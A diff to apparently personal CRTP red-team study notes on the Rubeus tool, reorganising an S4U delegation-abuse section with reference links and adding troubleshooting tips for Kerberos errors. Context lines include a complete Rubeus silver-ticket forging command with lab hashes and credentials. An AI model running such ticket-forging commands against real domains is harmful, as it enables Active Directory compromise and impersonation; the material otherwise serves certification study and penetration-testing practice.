@@ -617,6 +617,15 @@ optional:
 rubeus.exe silver /service:cifs/dc1.ecorp.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ecorp.lab\Administrator /credpassword:Password01 /user:whoever /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ecorp.lab /ptt
 ```
 
+
+
+#### S4U
+https://specterops.gitbook.io/ghostpack/rubeus/constrained-delegation-abuse
+
+Kerberos Delegation and S4U:
+- [Unconstrained S4U](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-unconstrained-delegation-attack-flow-with-spoolsample)
+- [Constrained S4U](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-s4u---constrained-delegation-user)
+
 * * *
 
 #### Maintenance
@@ -630,12 +639,13 @@ View ticket:
 We can purge by LUID also:
 ```rubeus.exe purge /luid:0x8f57c```
 
-#### S4U
-https://specterops.gitbook.io/ghostpack/rubeus/constrained-delegation-abuse
 
-Kerberos Delegation and S4U:
-- [Unconstrained S4U](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-unconstrained-delegation-attack-flow-with-spoolsample)
-- [Constrained S4U](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-s4u---constrained-delegation-user)
+
+#### Troubleshooting - errors
+
+```[X] KRB-ERROR (24) : KDC_ERR_PREAUTH_FAILED``` - You are putting in the hash wrong!
+
+```[X] Error 1326 running LsaLookupAuthenticationPackage (ProtocolStatus): The user name or password is incorrect``` - you are putting in the ticket wrong (Probs didnt copy paste it properly)
 
 * * *
 
